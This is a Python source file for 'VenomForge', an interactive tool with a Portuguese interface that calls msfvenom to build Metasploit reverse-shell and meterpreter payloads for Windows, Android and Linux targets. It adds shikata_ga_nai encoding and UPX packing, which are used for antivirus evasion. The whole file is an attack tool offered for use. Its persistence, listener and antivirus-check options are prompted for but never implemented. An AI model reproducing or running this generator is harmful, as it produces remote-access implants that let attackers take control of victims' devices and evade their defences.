import os
import socket
from pyfiglet import figlet_format
from colorama import init, Fore
from tqdm import tqdm
import emoji
from getpass import getuser
from tabulate import tabulate

init(autoreset=True)

def detectar_ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def escolher_encoder():
    print(Fore.YELLOW + "\n------------------[ ESCOLHER ENCODER ]------------------")
    print(Fore.CYAN + "Encoder padrão: x86/shikata_ga_nai")
    print(Fore.CYAN + "Deseja usar o encoder padrão, escolher outro ou nenhum?")
    opcoes_encoder = [
        ["1", "Usar encoder padrão", "x86/shikata_ga_nai"],
        ["2", "Escolher outro encoder", "Digite o nome do encoder desejado"],
        ["3", "Não usar encoder", "Nenhum"]
    ]
    print(tabulate(opcoes_encoder, headers=["Opção", "Descrição", "Ação"], tablefmt="fancy_grid"))

    opcao = input(Fore.CYAN + "Escolha (1/2/3): ").strip()

    if opcao == "1":
        return "x86/shikata_ga_nai"
    elif opcao == "2":
        encoder = input(Fore.CYAN + "Digite o nome do encoder desejado (ex: x86/countdown): ").strip()
        return encoder
    elif opcao == "3":
        return None
    else:
        print(Fore.RED + "Opção inválida. Usando encoder padrão.")
        return "x86/shikata_ga_nai"

def escolher_payload(sistema):
    if sistema == "windows":
        print(Fore.YELLOW + "\nEscolha o tipo de payload para Windows:")
        opcoes_windows = [
            ["1", "Reverse TCP (meterpreter)", "windows/meterpreter/reverse_tcp"],
            ["2", "Shell Reverse TCP", "windows/shell/reverse_tcp"],
            ["3", "Bind TCP (meterpreter)", "windows/meterpreter/bind_tcp"]
        ]
        print(tabulate(opcoes_windows, headers=["Opção", "Descrição", "Payload"], tablefmt="fancy_grid"))
        opcao = input(Fore.CYAN + "Escolha (1/2/3): ").strip()

        if opcao == "1":
            return "windows/meterpreter/reverse_tcp"
        elif opcao == "2":
            return "windows/shell/reverse_tcp"
        elif opcao == "3":
            return "windows/meterpreter/bind_tcp"
        else:
            print(Fore.RED + "Opção inválida. Usando payload padrão (reverse_tcp).")
            return "windows/meterpreter/reverse_tcp"
    
    elif sistema == "android":
        print(Fore.YELLOW + "\nEscolha o tipo de payload para Android:")
        opcoes_android = [
            ["1", "Reverse TCP (meterpreter)", "android/meterpreter/reverse_tcp"]
        ]
        print(tabulate(opcoes_android, headers=["Opção", "Descrição", "Payload"], tablefmt="fancy_grid"))
        opcao = input(Fore.CYAN + "Escolha (1): ").strip()
        return "android/meterpreter/reverse_tcp" if opcao == "1" else "android/meterpreter/reverse_tcp"
    
    elif sistema == "linux":
        print(Fore.YELLOW + "\nEscolha o tipo de payload para Linux:")
        opcoes_linux = [
            ["1", "Reverse TCP (meterpreter)", "linux/x86/meterpreter/reverse_tcp"],
            ["2", "Shell Reverse TCP", "linux/x86/shell/reverse_tcp"]
        ]
        print(tabulate(opcoes_linux, headers=["Opção", "Descrição", "Payload"], tablefmt="fancy_grid"))
        opcao = input(Fore.CYAN + "Escolha (1/2): ").strip()

        if opcao == "1":
            return "linux/x86/meterpreter/reverse_tcp"
        elif opcao == "2":
            return "linux/x86/shell/reverse_tcp"
        else:
            print(Fore.RED + "Opção inválida. Usando payload padrão (reverse_tcp).")
            return "linux/x86/meterpreter/reverse_tcp"

def gerar_payload_exe(sistema, lhost, lport, nome_payload, encoder, compactar_upx):
    user = getuser()  # Obtém o nome do usuário automaticamente
    extensao = "exe" if sistema == "windows" else "apk" if sistema == "android" else "elf"
    caminho_payload = f"C:\\Users\\{user}\\Downloads\\{nome_payload}.{extensao}"
    payload_tipo = escolher_payload(sistema)

    comando = f"wsl /snap/bin/msfvenom -p {payload_tipo} --platform {sistema} -a x86 LHOST={lhost} LPORT={lport} -f {extensao} -o /mnt/c/Users/{user}/Downloads/{nome_payload}.{extensao}"

    if encoder:
        comando += f" -e {encoder}"

    print(Fore.YELLOW + f"\n------------------[ GERANDO PAYLOAD {extensao.upper()} COM MSFVENOM ]------------------")
    print(emoji.emojize(":skull: Gerando payload... :skull:"))

    for _ in tqdm(range(100), desc="Gerando", ncols=100, unit="%", colour="magenta"):
        pass

    resultado = os.system(comando)

    if resultado != 0:
        print(Fore.RED + "[!] Erro ao gerar payload com msfvenom!")
        return

    print(Fore.GREEN + f"[+] Payload gerado com sucesso: {caminho_payload}")

    if compactar_upx:
        print(Fore.YELLOW + "\n------------------[ COMPACTANDO COM UPX ]------------------")
        caminho_payload_wsl = f"/mnt/c/Users/{user}/Downloads/{nome_payload}.{extensao}"
        comando_upx = f"wsl upx {caminho_payload_wsl}"

        resultado_upx = os.system(comando_upx)

        if resultado_upx != 0:
            print(Fore.RED + "[!] Erro ao compactar o payload com UPX!")
        else:
            print(Fore.GREEN + "[+] Payload compactado com sucesso com UPX!")

def menu():
    print("=" * 66)
    print(Fore.CYAN + figlet_format("VenomForge", font="slant"))
    print("=" * 66)

    sistema = input(Fore.CYAN + "Escolha o alvo (windows/android/linux): ").lower()
    if sistema not in ["windows", "android", "linux"]:
        print(Fore.RED + "Sistema não suportado.")
        return

    ip_detectado = detectar_ip_local()
    usar_ip = input(Fore.CYAN + f"IP detectado: {ip_detectado}. Deseja usar esse IP? (S/n): ").strip().lower()
    lhost = ip_detectado if usar_ip in ["", "s", "sim"] else input(Fore.CYAN + "Digite o IP manualmente (LHOST): ")
    
    lport = input(Fore.CYAN + "Digite a porta (LPORT): ")
    nome_payload = input(Fore.CYAN + f"Nome do payload ({'exe/apk/elf'}): ")
    encoder = escolher_encoder()

    print(Fore.YELLOW + "\n==================[ ESCOLHER PERSISTÊNCIA ]==================")
    persistencia = input(Fore.CYAN + "Deseja adicionar persistência ao payload? (S/n): ").strip().lower()

    print(Fore.YELLOW + "\n==================[ COMPACTAR COM UPX? ]==================")
    compactar_upx = input(Fore.CYAN + "Deseja compactar o payload com UPX? (S/n): ").strip().lower() in ["", "s", "sim"]

    print(Fore.YELLOW + "\n==================[ GERAR LISTENER AUTOMÁTICO? ]==================")
    gerar_listener = input(Fore.CYAN + "Deseja gerar listener automático? (S/n): ").strip().lower() in ["", "s", "sim"]

    print(Fore.YELLOW + "\n==================[ VERIFICAR SEGURANÇA? ]==================")
    verificar_segurança = input(Fore.CYAN + "Deseja verificar se o payload é detectável por antivírus? (S/n): ").strip().lower() in ["", "s", "sim"]

    print(Fore.YELLOW + "\n==================[ VENOMFORGE PAYLOAD GENERATOR ]==================")
    configuracoes = [
        ["Alvo", sistema.capitalize()],
        ["IP", lhost],
        ["Porta", lport],
        ["Nome do Payload", nome_payload],
        ["Encoder", encoder if encoder else "Nenhum"],
        ["Persistência", "Sim" if persistencia else "Não"],
        ["Compactação com UPX", "Sim" if compactar_upx else "Não"],
        ["Gerar Listener Automático", "Sim" if gerar_listener else "Não"],
        ["Verificar Segurança", "Sim" if verificar_segurança else "Não"]
    ]
    print(tabulate(configuracoes, headers=["Configuração", "Valor"], tablefmt="fancy_grid"))
    print("=" * 66)

    gerar_payload_exe(sistema, lhost, lport, nome_payload, encoder, compactar_upx)
    print("\n" + "=" * 66)

if __name__ == "__main__":
    menu()